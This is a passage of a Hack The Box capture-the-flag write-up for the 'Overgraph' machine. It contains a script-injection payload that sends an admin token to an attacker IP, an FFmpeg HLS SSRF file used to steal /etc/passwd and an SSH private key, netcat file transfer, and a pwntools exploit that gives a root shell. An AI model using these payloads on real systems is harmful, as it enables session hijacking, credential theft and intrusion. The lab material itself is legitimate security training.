request.send(JSON.stringify({operationName: 'update',variables: {firstname: &quot;{{$on.constructor('new Image().src=\&quot;http://10.10.14.2/?a=\&quot; + window.localStorage.getItem(\&quot;adminToken\&quot;);')()}}&quot;,lastname: 'null',id: '62abe72aa6d27a07b20d9653',newusername: 'Sally'},query: 'mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}'}));</code></pre>
</doc-codeblock></div>
<p>The above is what we need the admin to execute in his browser. Now we can send all this using the open redirect vulnerability and sending the link in the chat.</p>
<ol>
<li>Base64 encode all this payload above:
<figure class="content-center">
    <img src="images/image10.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</li>
<li>Start a python web server in our machine.</li>
</ol>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo python3 -m http.server 80                                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
</doc-codeblock></div>
<ol start="3">
<li>Use the open redirect vuln:</li>
</ol>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash"># Make sure you urlencode the equal signs &quot;=&quot;, if any...
http://graph.htb/?redirect=javascript:eval(atob(&quot;c3RlYWxfYWRtaW5Ub...%3d&quot;))</code></pre>
</doc-codeblock></div>
<p>Send this link in the chat and wait a minute to receive the admin token:
<figure class="content-center">
    <img src="images/image11.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
Add the adminToken to our local storage in the browser, change the <code v-pre>admin</code> to true and refresh the page:
<figure class="content-center">
    <img src="images/image12.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>As the page refresh we get a new option in the menu - Uploads:
<figure class="content-center">
    <img src="images/image13.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="ffmpeg-ssrf--lfi">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#ffmpeg-ssrf--lfi">#</doc-anchor-trigger>
        <span>FFmpeg SSRF + LFI</span>
    </h3>
</doc-anchor-target>
<p>It seems that we can upload videos of type avi, mp4, mkv and webm. Doing a bit of research we find that <a href="https://hackerone.com/reports/1062888">this hackerone report</a> that explains an External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing in TikTok app. The POC is well described so we can combine that with <a href="https://github.com/0xcoyote/FFmpeg-HLS-SSRF">this exploit</a> to retrieve files from the target.
Create the file <code v-pre>video.avi</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.14.4/initial.m3u?filename=/etc/passwd
#EXT-X-ENDLIST</code></pre>
</doc-codeblock></div>
<p>When we upload this file, it will make a call to <a href="http://10.10.14.4/initial.m3u?filename=/etc/passwd">http://10.10.14.4/initial.m3u?filename=/etc/passwd</a> where we will prepare a server to extract the file passed in the argument.</p>
<p>Git clone and run the server:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ git clone https://github.com/0xcoyote/FFmpeg-HLS-SSRF
$ cd FFmpeg-HLS-SSRF
$ python3 server.py --external-addr 10.10.14.4 --port 80</code></pre>
</doc-codeblock></div>
<p>Submit the <code v-pre>video.avi</code> file in the web page and wait to the server to extract the file data. Once it is done, the tool will save the output into a file, but without line breaks, so we need to format ourselfs:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinuser:x:1000:1000:user:/home/user:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemongodb:x:113:118::/var/lib/mongodb:/usr/sbin/nologin</code></pre>
</doc-codeblock></div>
<p>The output of <code v-pre>/etc/passwd</code> reveals the user <code v-pre>user</code> is present, have a home directory and a <code v-pre>/bin/bash</code> shell. We should target him and try to extract his SSH keys. We change the <code v-pre>video.avi</code> file to:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.14.4/initial.m3u?filename=/home/user/.ssh/id_rsa
#EXT-X-ENDLIST</code></pre>
</doc-codeblock></div>
<p>Upload again!</p>
<p>Cool, we got the SSH key of <code v-pre>user</code>, we can use it to SSH in now, we just need to add the line breaks formating the file and give its permissions:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ chmod 600 user.idrsa
$ ssh -i user.idrsa user@10.10.11.157
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 17 Jun 2022 03:19:53 AM UTC

  System load:           0.0
  Usage of /:            68.8% of 4.84GB
  Memory usage:          11%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.157
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e23c

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

18 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 16 23:51:10 2022 from 10.10.14.4
user@overgraph:~$</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="privilege-escalation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
        <span>Privilege Escalation</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="enumeration-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration-1">#</doc-anchor-trigger>
        <span>Enumeration</span>
    </h3>
</doc-anchor-target>
<p>Enumerating the machine we see a socat process running as root:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">user@overgraph:~$ ps -ef | grep root
...[SNIP]...
root 953 950  0 Jun16 ?        00:00:00 /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
root 955 953  0 Jun16 ?        00:00:00 sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
root 956 955  0 Jun16 ?        00:00:00 socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
...[SNIP]...</code></pre>
</doc-codeblock></div>
<p>It is a custom application:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">user@overgraph:/usr/local/bin/Nreport$ ls -la
total 40
drwxr-xr-x 3 root root  4096 Apr 12 17:38 .
drwxr-xr-x 3 root root  4096 Apr 12 17:38 ..
drwxr-xr-x 2 root root  4096 Feb 14 18:31 libc
-rwxr-xr-x 1 root root 26040 Feb 14 12:30 nreport

user@overgraph:/usr/local/bin/Nreport$ ./nreport 
Custom Reporting v1

Enter Your Token: test
Invalid Token</code></pre>
</doc-codeblock></div>
<p>Lets download the binary and the libc folder to our machine:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash"># Kali - Receiver
$ nc -l -p 1234 &gt; nreport

# Target - Sender
$ nc -w 3 10.10.14.4 1234 &lt; /usr/local/bin/Nreport/nreport
...[SNIP]...</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="binary-exploitation---code-analyses">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#binary-exploitation---code-analyses">#</doc-anchor-trigger>
        <span>Binary Exploitation - Code Analyses</span>
    </h3>
</doc-anchor-target>
<p>First we see that the binary is linked to the libc so we will need to patch:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ checksec ./nreport                  
[*] '/home/caue/htb/overgraph/binary/nreport'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'/usr/local/bin/Nreport/libc/'

$ ldd ./nreport 
        linux-vdso.so.1 (0x00007fffe98fa000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2dc3ff2000)
        /usr/local/bin/Nreport/libc/ld-2.25.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f2dc41e9000)</code></pre>
</doc-codeblock></div>
<p>We can use <a href="https://github.com/NixOS/patchelf">Pathelf tools</a> to do the job:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ patchelf --set-interpreter `pwd`/libc/ld-2.25.so --set-rpath `pwd`/libc/ nreport</code></pre>
</doc-codeblock></div>
<p>We can check that now is using the right libc:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ checksec nreport
[*] '/home/caue/htb/overgraph/binary/nreport'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'/home/caue/htb/overgraph/binary/libc/'

$ ldd ./nreport 
        linux-vdso.so.1 (0x00007fffcc9e5000)
        libc.so.6 =&gt; /home/caue/htb/overgraph/binary/libc/libc.so.6 (0x00007f08c6ad2000)
        /home/caue/htb/overgraph/binary/libc/ld-2.25.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f08c6e71000)</code></pre>
</doc-codeblock></div>
<p>We try to run the binary but it asks for a token that we don&#x27;t know.
Open the binary in Ghidra to have a look at the functions.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">main()</div>
<pre class="language-c"><code v-pre class="language-c">void main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_13 [3];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts(&quot;Custom Reporting v1\n&quot;);
  auth();
  printf(&quot;\nWelcome %s&quot;,userinfo1);
  do {
    puts(
        &quot;\n1.Create New Message\n2.Delete a Message\n3.Edit Messages\n4.Report All Messages\n5.Exit&quot;
        );
    printf(&quot;&gt; &quot;);
    __isoc99_scanf(&quot; %1[^\n]&quot;,local_13);
    iVar1 = atoi(local_13);
    switch(iVar1) {
    case 1:
      create();
      break;
    case 2:
      delete();
      break;
    case 3:
      edit();
      break;
    case 4:
      report();
      break;
    case 5:
      system(userinfo1 + 0x28);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}</code></pre>
</doc-codeblock></div>
<p>We see the main function prints the &quot;Custom Reporting&quot; banner and then calls <code v-pre>auth()</code>. Lets see this function:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">auth()</div>
<pre class="language-c"><code v-pre class="language-c">...[SNIP]...
  printf(&quot;Enter Your Token: &quot;);
  fgets(userinfo1 + 0x78,0x13,stdin);
  sVar1 = strlen(userinfo1 + 0x78);
  if (sVar1 != 0xf) {
    puts(&quot;Invalid Token&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  for (local_4c = 0xd; -1 &lt; local_4c; local_4c = local_4c + -1) {
    *(uint *)((long)&amp;local_48 + (long)local_4c * 4) =
         *(uint *)(secret + (long)local_4c * 4) ^ (int)userinfo1[121] ^ (int)userinfo1[122] ^
         (int)userinfo1[120] ^ (int)userinfo1[129] ^ (int)userinfo1[133];
  }
  if ((int)local_40 + (int)local_48 + local_48._4_4_ != 0x134) {
    puts(&quot;Invalid Token&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (local_28._4_4_ + local_30._4_4_ + (int)local_28 != 0x145) {
    puts(&quot;Invalid Token&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (local_18._4_4_ + local_20._4_4_ + (int)local_18 != 0x109) {
    puts(&quot;Invalid Token&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
...[SNIP]...</code></pre>
</doc-codeblock></div>
<p>First it checks if the input is 15 bytes. Then it just take 5 bytes from it and make xor with <code v-pre>secret</code>.
Reverse engineering this in python:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-python"><code v-pre class="language-python">st = 65
sp = 127
def check():
    for a in range(st,sp):
        for b in range(st,sp):
            for c in range(st,sp):
                for d in range(st,sp):
                    for e in range(st,sp):
                        xor = a ^ b ^ c ^ d ^ e
                        if (xor ^ 0x12) + (xor^0x1) + (xor ^ 0x12) == 0x134:
                            if (xor ^ 0x16) + (xor ^ 0x7) + (xor ^ 0x1f) == 0x145:
                                if (xor ^ 0x0) + (xor ^ 0x40) + (xor ^ 0x10) == 0x109:
                                    print &quot;a is : &quot; + chr(a)
                                    print &quot;b is : &quot; + chr(b)
                                    print &quot;c is : &quot; + chr(c)
                                    print &quot;d is : &quot; + chr(d)
                                    print &quot;e is : &quot; + chr(e)
                                    exit()
check()</code></pre>
</doc-codeblock></div>
<p>It will generate the token from <code v-pre>secret</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python2 bypass-token.py
a is : A
b is : A
c is : A
d is : A
e is : s</code></pre>
</doc-codeblock></div>
<p>So the token is <code v-pre>AAAAAAAAAAAAAs</code>. It has 14 characters as the last one is <code v-pre>\n</code> in a total of 15 bytes.
Running again we see the options:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ ./nreport
Custom Reporting v1

Enter Your Token: AAAAAAAAAAAAAs
Enter Name: test

Welcome test
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
&gt;</code></pre>
</doc-codeblock></div>
<p>Lets run with GDB and debug:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ gdb nreport
pwndbg&gt; run
Starting program: /home/caue/htb/overgraph/binary/nreport 
Custom Reporting v1

Enter Your Token: AAAAAAAAAAAAAs
Enter Name: caue

Welcome caue
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
&gt;
(CTRL + C)

pwndbg&gt; x/40s &amp;userinfo1
0x404180 &lt;userinfo1&gt;:   &quot;caue&quot;
...[SNIP]...
0x4041a8 &lt;userinfo1+40&gt;:        &quot;echo \&quot;Last Used On $(date)\&quot; &gt;&gt; /var/log/kreport&quot;
...[SNIP]...</code></pre>
</doc-codeblock></div>
<p>Analysing the <code v-pre>userinfo</code> we see the name we entered and a string that calls system.
Maybe we could put the address <code v-pre>0x4041a8</code> as our name in the program, then use the <code v-pre>edit()</code> function to overwrite the <code v-pre>Last Used On $(date)\</code> to <code v-pre>/bin/sh</code>.</p>
<p>We are lucky because the <code v-pre>edit()</code> function do not check for the index and we can edit addresses:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">edit()</div>
<pre class="language-c"><code v-pre class="language-c">void edit(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (Arryindex == 0) {
    puts(&quot;No Message Created&quot;);
  }
  else {
    printf(&quot;Enter number to edit: &quot;);
    __isoc99_scanf(&quot;%d[^\n]&quot;,&amp;local_14);
    printf(&quot;Message Title: &quot;);
    __isoc99_scanf(&quot; %59[^\n]&quot;,*(undefined8 *)(message_array + (long)local_14 * 8));
    printf(&quot;Message: &quot;);
    __isoc99_scanf(&quot;%100[^\n]&quot;,*(long *)(message_array + (long)local_14 * 8) + 0x3c);
    fflush(stdin);
    fflush(stdout);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="exploit">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit">#</doc-anchor-trigger>
        <span>Exploit</span>
    </h3>
</doc-anchor-target>
<p>We can use SSH to forward the port of the binary running as root:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ ssh -i user.idrsa user@10.10.11.157 -L 9851:127.0.0.1:9851</code></pre>
</doc-codeblock></div>
<p>Python script to exploit the binary:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">exploit.py</div>
<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
from pwn import *

context.clear(arch='amd64', os='linux')
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

def create(data):
    log.info('Creating a new message')
    io.recvuntil(b'5.Exit')
    io.sendline(b'1')
    io.recvlines(5)
    io.sendline(data)

def edit(data):
    log.info('Editing the message of index 12')
    io.recvuntil(b'5.Exit')
    io.sendline(b'3')
    io.recvline(1)
    io.sendline(b'12')
    io.sendline(data)

def exit_1():
    log.info('Exiting now...')
    io.recvuntil(b'5.Exit')
    io.sendline(b'5')

io = remote(&quot;127.0.0.1&quot;,9851)
#io = process(&quot;./nreport&quot;)

io.recvlines(2)
io.sendline(b'AAAAAAAAAAAAAs')
io.sendline(p64(0x4041a8))

create(b'A'*160)
edit(b'/bin/bash')
exit_1()
io.interactive()</code></pre>
</doc-codeblock></div>
<p>For some reason after executing the python script I couldn&#x27;t get output of the system commands, so I sent myself a reverse shell from the <code v-pre>pwndbg</code> interactive session:
<figure class="content-center">
    <img src="images/image15.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overflow/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Overflow</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/phoenix/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Phoenix</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2023. Caue All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Overgraph", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
</body>
</html>
